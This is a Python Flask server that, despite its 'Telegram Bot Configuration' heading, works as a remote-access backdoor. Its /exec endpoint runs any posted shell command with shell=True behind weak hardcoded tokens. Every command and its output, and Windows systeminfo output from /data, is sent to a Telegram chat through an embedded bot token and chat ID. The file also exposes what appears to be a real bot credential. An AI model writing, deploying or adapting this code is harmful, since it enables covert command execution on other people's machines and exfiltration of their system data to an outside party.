# Telegram Bot Configuration

from flask import Flask, request, jsonify
import subprocess
import telebot
from datetime import datetime
import threading

# Telegram Bot Configuration
BOT_TOKEN = '7333847070:AAFUwJpWNvTZTQLVIsbcCicJZlWAmqFFNa4'  # Replace with your bot token      # Replace with your chat ID
CHAT_ID = '7416312733'

bot = telebot.TeleBot(BOT_TOKEN)

# Server Configuration
PORT = 5000  # Flask server port
VALID_TOKENS = {"token123", "secureToken456", "clientABC789"}  # Example tokens

# Command history
command_history = []

# Telegram Notification Function
def send_to_telegram(message):
    bot.send_message(CHAT_ID, message)

# Command Execution
def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode()
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode()}"

# HTTP Routes
app = Flask(__name__)

@app.route('/authenticate', methods=['POST'])
def authenticate():
    data = request.json
    token = data.get("token")
    if token in VALID_TOKENS:
        return jsonify({"status": "success", "message": "Authentication successful!"})
    return jsonify({"status": "fail", "message": "Invalid token!"})

@app.route('/exec', methods=['POST'])
def execute():
    data = request.json
    token = data.get("token")
    if token not in VALID_TOKENS:
        return jsonify({"status": "fail", "message": "Authentication failed!"})

    command = data.get("command")
    if not command:
        return jsonify({"status": "fail", "message": "No command provided!"})

    output = execute_command(command)
    command_history.append({"command": command, "output": output, "timestamp": str(datetime.now())})

    # Send the output back to client and to Telegram
    send_to_telegram(f"📩 Command executed:\n{command}\nOutput: {output}")
    return jsonify({"status": "success", "message": "Command executed!", "output": output})

@app.route('/data', methods=['POST'])
def get_data():
    data = request.json
    token = data.get("token")
    if token not in VALID_TOKENS:
        return jsonify({"status": "fail", "message": "Authentication failed!"})

    # Collect system data
    try:
        system_info = subprocess.check_output("systeminfo", shell=True).decode()
        send_to_telegram(f"📩 System Data:\n{system_info}")
        return jsonify({"status": "success", "message": "System data collected!", "data": system_info})
    except Exception as e:
        return jsonify({"status": "fail", "message": f"Failed to collect system data: {str(e)}"})

# Telegram Bot Polling Function
def run_bot():
    bot.polling()

# Run Flask App
if __name__ == "__main__":
    # Start the Telegram bot in a separate thread
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()

    # Run Flask app
    app.run(host="0.0.0.0", port=PORT)
